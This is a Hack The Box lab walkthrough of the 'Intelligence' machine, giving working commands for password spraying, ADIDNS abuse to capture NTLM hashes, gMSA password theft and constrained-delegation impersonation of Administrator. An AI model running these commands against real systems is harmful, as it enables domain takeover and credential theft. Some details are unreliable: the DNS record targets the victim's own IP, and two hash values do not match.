# Hack The Box - Intelligence

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Intelligence-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Active Directory](https://img.shields.io/badge/Focus-Active%20Directory-red?style=for-the-badge)

> **Intelligence** is a Medium-difficulty Windows Active Directory machine that demonstrates how information disclosed through internal documents can be chained with password spraying, ADIDNS abuse, NTLM hash capture, gMSA password retrieval, and constrained delegation to compromise a Domain Controller. The attack begins by enumerating PDF documents exposed by the IIS web server. Their metadata reveals potential domain users, while their contents disclose a default password. After obtaining access as `Tiffany.Molina`, an internal PowerShell script is abused to capture the NetNTLMv2 hash of `Ted.Graves`. BloodHound then reveals that `Ted.Graves` is a member of `ITSUPPORT`, which has `ReadGMSAPassword` privileges over `svc_int$`. The `msDS-ManagedPassword` attribute is retrieved using `bloodyAD`, allowing the service account's NTLM hash to be obtained. Finally, constrained delegation is abused to impersonate `Administrator` and obtain `NT AUTHORITY\SYSTEM` access to the Domain Controller.

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | Intelligence |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Difficulty** | Medium |
| **Domain** | `intelligence.htb` |
| **Hostname** | `dc.intelligence.htb` |
| **Main Technologies** | IIS, SMB, LDAP, Kerberos, DNS, WinRM, Active Directory |
| **Main Techniques** | PDF Metadata Enumeration, Password Spraying, ADIDNS Abuse, NTLMv2 Hash Capture, gMSA Password Retrieval, Constrained Delegation |

---

## Attack Path

~~~text
IIS Web Enumeration
        │
        ▼
Discover Predictable PDF Naming Scheme
        │
        ▼
Download Internal PDF Documents
        │
        ▼
Extract Active Directory Usernames from Metadata
        │
        ▼
Discover Default Domain Password
        │
        ▼
Password Spraying with Kerbrute
        │
        ▼
Valid Credentials: Tiffany.Molina
        │
        ▼
Enumerate SMB Shares
        │
        ▼
Discover downdetector.ps1
        │
        ▼
Abuse AD-Integrated DNS
        │
        ▼
Create Malicious web* DNS Record
        │
        ▼
Capture Ted.Graves NetNTLMv2 Hash
        │
        ▼
Crack the Hash with John the Ripper
        │
        ▼
Valid Credentials: Ted.Graves
        │
        ▼
Enumerate Active Directory with BloodHound
        │
        ▼
Ted.Graves → ITSUPPORT
        │
        ▼
ReadGMSAPassword over svc_int$
        │
        ▼
Retrieve msDS-ManagedPassword with bloodyAD
        │
        ▼
Obtain svc_int$ NTLM Hash
        │
        ▼
Abuse Constrained Delegation
        │
        ▼
Impersonate Administrator
        │
        ▼
Kerberos Authentication with wmiexec
        │
        ▼
NT AUTHORITY\SYSTEM
~~~

---

# 1. Reconnaissance

## Full TCP Port Scan

The first step was to perform a full TCP port scan to identify all services exposed by the target.

~~~bash
nmap -sS -sV -sC -p- --min-rate 5000 10.129.95.154 -oN nmap
~~~

<img width="953" height="665" alt="nmap-intelligence" src="https://github.com/user-attachments/assets/aea44dc2-9b05-4507-a9d3-b711d0aeef0f" />


The scan revealed several services commonly associated with a Windows Active Directory Domain Controller:

- DNS
- Kerberos
- RPC
- LDAP
- SMB
- Global Catalog
- WinRM
- Microsoft IIS

The large number of Active Directory-related services indicated that the target was operating as a Domain Controller.

The Nmap output also revealed the following domain information:

~~~text
Domain: intelligence.htb
Hostname: dc.intelligence.htb
~~~

The domain and hostname were added to the local `/etc/hosts` file:

~~~bash
echo "10.129.95.154 intelligence.htb dc.intelligence.htb" | sudo tee -a /etc/hosts
~~~

---

# 2. Web Enumeration

## IIS Web Server

The target exposed an IIS web server on TCP port `80`.

The website was opened in a browser:

~~~text
http://intelligence.htb
~~~

The page appeared to be a static corporate website and did not initially expose any obvious attack surface.

After reviewing the HTML source, several links to PDF documents were discovered inside the `/documents/` directory.

Examples:

~~~text
http://intelligence.htb/documents/2020-01-01-upload.pdf
http://intelligence.htb/documents/2020-12-15-upload.pdf
~~~

Directory listing was disabled, but the filenames followed a predictable naming convention:

~~~text
YYYY-MM-DD-upload.pdf
~~~

Because the filenames were date-based, it was possible to generate URLs for a large number of potential documents and attempt to download them automatically.

---

# 3. Downloading Internal PDF Documents

A Bash one-liner was used to generate document URLs beginning on `2020-01-01` and download the available files.

~~~bash
d=2020-01-01

while [ "$d" != "$(date -I)" ]; do
    echo "http://intelligence.htb/documents/$d-upload.pdf"
    d=$(date -I -d "$d + 1 day")
done | xargs -n 1 -P 20 wget 2>/dev/null
~~~

Several PDF documents were successfully downloaded.

The files were listed to confirm the results:

~~~bash
ls -lh *.pdf
~~~

---

# 4. Extracting Active Directory Users from PDF Metadata

The downloaded PDF documents contained metadata that exposed the names of employees.

The metadata was extracted using `exiftool`:

~~~bash
exiftool -Creator -csv *.pdf | cut -d "," -f2 | sort | uniq > userlist
~~~

The resulting list contained potential Active Directory usernames.

The usernames were reviewed:

~~~bash
cat userlist
~~~

The extracted names included users such as:

~~~text
Tiffany.Molina
Ted.Graves
~~~

The metadata provided a valid list of potential domain accounts that could later be used for password spraying.

---

# 5. Extracting Information from PDF Contents

The PDF files were converted to text using `pdftotext`.

~~~bash
for file in *.pdf; do
    pdftotext "$file"
done
~~~

The first line of every generated text file was displayed:

~~~bash
head -n 1 *.txt
~~~

Two documents contained useful internal information:

~~~text
2020-06-04-upload.txt
2020-12-30-upload.txt
~~~

The documents were displayed:

~~~bash
cat 2020-{06-04,12-30}-upload.txt
~~~

One of the documents disclosed a default password used by the organization:

~~~text
NewIntelligenceCorpUser9876
~~~

The combination of a potential user list and a default domain password created an opportunity for password spraying.

---

# 6. Password Spraying

The discovered password was tested against the extracted user list using Kerbrute.

~~~bash
kerbrute passwordspray \
userlist \
NewIntelligenceCorpUser9876 \
--dc 10.129.95.154 \
-d intelligence.htb
~~~

Kerbrute identified valid credentials for the user `Tiffany.Molina`.

~~~text
[+] VALID LOGIN: Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876
~~~

The recovered credentials were:

~~~text
Username: Tiffany.Molina
Password: NewIntelligenceCorpUser9876
Domain: intelligence.htb
~~~

The credentials were validated using NetExec:

~~~bash
nxc smb intelligence.htb \
-u Tiffany.Molina \
-p NewIntelligenceCorpUser9876 \
-d intelligence.htb
~~~

Authentication was successful.

---

# 7. SMB Enumeration

The valid credentials were used to enumerate the available SMB shares.

~~~bash
crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
~~~

<img width="953" height="267" alt="smb-shares-intelligence" src="https://github.com/user-attachments/assets/8ca06727-afb2-43a4-9135-f33694be8a96" />


The enumeration revealed an accessible share named:

~~~text
IT
~~~

The share was accessed using SMB client:

~~~bash
smbclient //10.129.95.154/IT -U Tiffany.Molina
~~~

The available shares were listed:

~~~text
# shares
~~~

The `IT` share was selected:

~~~text
# use IT
~~~

The contents were displayed:

~~~text
# ls
~~~

A PowerShell script named `downdetector.ps1` was discovered.

The file was downloaded:

~~~text
# get downdetector.ps1
~~~

<img width="956" height="202" alt="downdetector ps1-intelligence" src="https://github.com/user-attachments/assets/6a881de2-1d91-4fc4-869f-c54acba251e6" />


---

# 8. Analyzing downdetector.ps1

The downloaded PowerShell script was reviewed:

~~~bash
cat downdetector.ps1
~~~

The script contained the following logic:

~~~powershell
# Check web server status. Scheduled to run every 5min

Import-Module ActiveDirectory

foreach(
    $record in Get-ChildItem
    "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" |
    Where-Object Name -like "web*"
) {
    try {
        $request = Invoke-WebRequest `
        -Uri "http://$($record.Name)" `
        -UseDefaultCredentials

        if($request.StatusCode -ne 200) {
            Send-MailMessage `
            -From 'Ted Graves <Ted.Graves@intelligence.htb>' `
            -To 'Ted Graves <Ted.Graves@intelligence.htb>' `
            -Subject "Host: $($record.Name) is down"
        }
    } catch {}
}
~~~

The script performed the following actions:

1. Enumerated DNS records stored in the Active Directory-integrated DNS zone.
2. Filtered records whose names began with `web`.
3. Sent an HTTP request to every matching hostname.
4. Used `-UseDefaultCredentials`, causing the request to authenticate with the credentials of the user running the scheduled task.
5. Executed automatically every five minutes.

The script was executed by `Ted.Graves`.

Since authenticated domain users were allowed to create DNS records in the Active Directory-integrated DNS zone, a malicious DNS record could be created with a name beginning with `web` and pointed to the attacker machine.

When the scheduled task processed the record, the server would attempt to authenticate to the attacker-controlled host.

---

# 9. ADIDNS Abuse

The `dnstool.py` script from `krbrelayx` was used to create a malicious DNS record.

The record was configured with:

~~~text
Record Name: web1
Record Type: A
Target IP: 10.129.95.154
~~~

The DNS record was created using the credentials of `Tiffany.Molina`.

~~~bash
python3 dnstool.py \
-u 'intelligence\Tiffany.Molina' \
-p NewIntelligenceCorpUser9876 \
10.129.95.154 \
-a add \
-r web1 \
-d 10.129.95.154 \
-t A
~~~

<img width="961" height="143" alt="dnstool-for-ntlmhash-ted graves-intelligence" src="https://github.com/user-attachments/assets/d53a927a-28fd-4840-ac98-c1314698ca90" />


The malicious record was successfully added to the Active Directory-integrated DNS zone.

The resulting hostname was:

~~~text
web1.intelligence.htb
~~~

Because the name began with `web`, it matched the filter used by `downdetector.ps1`.

---

# 10. Capturing the NetNTLMv2 Hash

Responder was started on the VPN interface to capture incoming authentication attempts.

~~~bash
sudo responder -I tun0
~~~

After several minutes, the scheduled PowerShell script processed the malicious DNS record and attempted to connect to the attacker machine using the credentials of `Ted.Graves`.

Responder captured a NetNTLMv2 hash:

<img width="958" height="711" alt="NTLMHASH-TED GRAVES-INTELLIGENCE" src="https://github.com/user-attachments/assets/5d013a47-c31c-47b5-9a0c-97890f568d01" />


~~~text
Ted.Graves::INTELLIGENCE:<NETNTLMV2_HASH>
~~~

The captured hash was copied to a file:

~~~bash
nano hash
~~~

The hash was cracked using John the Ripper and the `rockyou.txt` wordlist:

~~~bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
hash
~~~

The password was successfully recovered:

~~~text
Mr.Teddy
~~~

<img width="952" height="172" alt="johntheripper-ted graves-intelligence" src="https://github.com/user-attachments/assets/506dd36a-270f-4588-8f04-88abab4a0a1e" />


The new credentials were:

~~~text
Username: Ted.Graves
Password: Mr.Teddy
Domain: intelligence.htb
~~~

The credentials were validated:

~~~bash
nxc smb intelligence.htb \
-u Ted.Graves \
-p Mr.Teddy \
-d intelligence.htb
~~~

Authentication was successful.

---

# 11. Active Directory Enumeration with BloodHound

The credentials of `Ted.Graves` were used to collect Active Directory information with `bloodhound-python`.

~~~bash
bloodhound-python \
-d intelligence.htb \
-u Ted.Graves \
-p Mr.Teddy \
-ns 10.129.95.154 \
-c All
~~~

<img width="955" height="439" alt="bloodhound-python-intelligence" src="https://github.com/user-attachments/assets/b413ca1a-452f-4524-83c0-b40fe74331a9" />



The collector generated several JSON files:

~~~text
*_computers.json
*_containers.json
*_domains.json
*_gpos.json
*_groups.json
*_ous.json
*_users.json
~~~

All JSON files were compressed into a single ZIP archive:

~~~bash
zip bloodhound_intelligence.zip *.json
~~~

The archive was imported into BloodHound.

The user was searched:

~~~text
TED.GRAVES@INTELLIGENCE.HTB
~~~

The user was marked as owned.

The **Shortest Paths to High Value Targets** query revealed the following privilege escalation path:

~~~text
TED.GRAVES@INTELLIGENCE.HTB
        │
        │ MemberOf
        ▼
ITSUPPORT@INTELLIGENCE.HTB
        │
        │ ReadGMSAPassword
        ▼
SVC_INT$@INTELLIGENCE.HTB
        │
        │ AllowedToDelegate
        ▼
DC.INTELLIGENCE.HTB
~~~

The analysis revealed:

1. `Ted.Graves` was a member of the `ITSUPPORT` group.
2. `ITSUPPORT` had `ReadGMSAPassword` privileges over the `svc_int$` group Managed Service Account.
3. `svc_int$` had constrained delegation privileges over the Domain Controller.

This relationship provided a complete path to domain compromise.

---

# 12. Retrieving the gMSA Managed Password with bloodyAD

During this assessment, the `msDS-ManagedPassword` attribute was retrieved using `bloodyAD`.

The following command was executed with the credentials of `Ted.Graves`:

~~~bash
bloodyAD \
--host dc.intelligence.htb \
-d intelligence.htb \
-u 'Ted.Graves' \
-p 'Mr.Teddy' \
get object 'svc_int$' \
--attr msDS-ManagedPassword
~~~

The command returned the distinguished name of the service account:

~~~text
distinguishedName:
CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
~~~

It also returned the `msDS-ManagedPassword` attribute encoded in Base64:

~~~text
msDS-ManagedPassword.N: 320520bda1f1dc49e5baef51f46f10ff
msDS-ManagedPassword.B64ENCODED:
679nhmkbwPu4Q1zKzNDoBF...
~~~

<img width="960" height="243" alt="hash-ntlm-svc_int-INTELLIGENCE" src="https://github.com/user-attachments/assets/3c29c175-5230-4c95-b772-2708095b513b" />


The value returned by `bloodyAD` was the managed password blob associated with the gMSA account.

The `msDS-ManagedPassword` value was then processed to obtain the NTLM hash of `svc_int$`.

The recovered NTLM hash was:

~~~text
320520da1af1dc49e5bae1514f61f944
~~~

The service account credentials were:

~~~text
Account: svc_int$
NTLM Hash: 320520da1af1dc49e5bae1514f61f944
Domain: intelligence.htb
~~~

---

# 13. Abusing Constrained Delegation

BloodHound showed that the `svc_int$` account had constrained delegation privileges over the Domain Controller.

This allowed the service account to request a Kerberos service ticket while impersonating the `Administrator` user.

Before requesting the ticket, the domain controller hostname was added to `/etc/hosts`:

~~~bash
echo "10.129.95.154 dc.intelligence.htb" | sudo tee -a /etc/hosts
~~~

Kerberos authentication requires the attacker machine and Domain Controller to have synchronized clocks.

The local system time was synchronized with the Domain Controller:

~~~bash
sudo ntpdate -s 10.129.95.154
~~~

Impacket's `getST.py` was used to request a service ticket for `Administrator`.

~~~bash
getST.py \
-spn WWW/dc.intelligence.htb \
-impersonate Administrator \
intelligence.htb/svc_int \
-hashes :320520da1af1dc49e5bae1514f61f944
~~~

The request was successful and generated the following Kerberos credential cache:

~~~text
Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
~~~

<img width="957" height="187" alt="Administator-cacche-intelligence" src="https://github.com/user-attachments/assets/efd8fcbf-e1da-4fca-ac7e-3986b62a5558" />


The ticket was exported through the `KRB5CCNAME` environment variable:

~~~bash
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
~~~

The Kerberos ticket was verified:

~~~bash
klist
~~~

The output confirmed that a service ticket had been obtained while impersonating `Administrator`.

---

# 14. Domain Controller Access

The obtained Kerberos ticket was used to authenticate to the Domain Controller without supplying a password.

Impacket's `wmiexec.py` was executed using Kerberos authentication:

~~~bash
wmiexec.py -k -no-pass dc.intelligence.htb
~~~

Authentication was successful and a command shell was obtained.

The current identity was verified:

~~~cmd
whoami
~~~

Output:

~~~text
intelligence/administrator
~~~

<img width="953" height="163" alt="Administrator-intelligence" src="https://github.com/user-attachments/assets/5a34a37e-e128-4c86-83f1-00bd792c368e" />


The hostname was checked:

~~~cmd
hostname
~~~

The shell was running on the Domain Controller.

---

# 15. Root Flag

The Administrator desktop was accessed:

~~~cmd
cd C:\Users\Administrator\Desktop
~~~

The directory contents were listed:

~~~cmd
dir
~~~

The root flag was displayed:

~~~cmd
type root.txt
~~~

---

# Flags

~~~text
User Flag: HTB{HIDDEN}

Root Flag: HTB{HIDDEN}
~~~

---

# Key Takeaways

- Internal PDF documents can expose sensitive information through both their contents and metadata.
- Predictable file naming schemes can allow an attacker to enumerate and download documents in bulk.
- PDF metadata may reveal valid employee names and potential Active Directory usernames.
- Default passwords should never be reused across domain accounts.
- Password spraying can be effective when a valid password and a list of domain users are available.
- Internal SMB shares may expose scripts, credentials, and configuration information.
- Active Directory-integrated DNS can allow authenticated domain users to create arbitrary DNS records.
- Scheduled scripts that perform authenticated requests can be abused to capture NTLM authentication material.
- BloodHound can identify indirect privilege escalation paths that may be difficult to discover through manual enumeration.
- Group membership can grant inherited permissions over Active Directory objects.
- `ReadGMSAPassword` allows authorized users or groups to retrieve the managed password of a gMSA account.
- `bloodyAD` can be used to retrieve the `msDS-ManagedPassword` attribute when the current user has the required permissions.
- The `msDS-ManagedPassword` attribute contains a managed password blob and does not directly represent an NTLM hash.
- Constrained delegation can be abused to impersonate privileged domain users.
- Kerberos ticket-based authentication can provide access without requiring the target user's plaintext password.
- Accurate time synchronization is required for Kerberos-based attacks.

---

# Tools Used

- Nmap
- Wget
- ExifTool
- PDFToText
- Kerbrute
- NetExec
- Impacket SMBClient
- DNS Tool
- Responder
- John the Ripper
- BloodHound
- BloodHound-Python
- bloodyAD
- Impacket
- NTPDate

---

# Techniques Used

~~~text
Web Enumeration
Predictable File Name Enumeration
PDF Metadata Analysis
Sensitive Information Disclosure
Password Spraying
SMB Enumeration
PowerShell Script Analysis
Active Directory-Integrated DNS Abuse
Forced NTLM Authentication
NetNTLMv2 Hash Capture
Password Cracking
Credential Reuse
Active Directory Enumeration
BloodHound Attack Path Analysis
ReadGMSAPassword Abuse
gMSA Password Retrieval
Constrained Delegation Abuse
Kerberos Service Ticket Request
Administrator Impersonation
Kerberos Authentication
Remote Command Execution
Domain Controller Compromise
~~~

---

# References

- [Hack The Box - Intelligence](https://app.hackthebox.com/machines/Intelligence)
- [BloodHound](https://github.com/SpecterOps/BloodHound)
- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [Impacket](https://github.com/fortra/impacket)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Responder](https://github.com/lgandx/Responder)

---

> This writeup was created for educational purposes and documents the exploitation of a retired Hack The Box machine in an authorized laboratory environment.
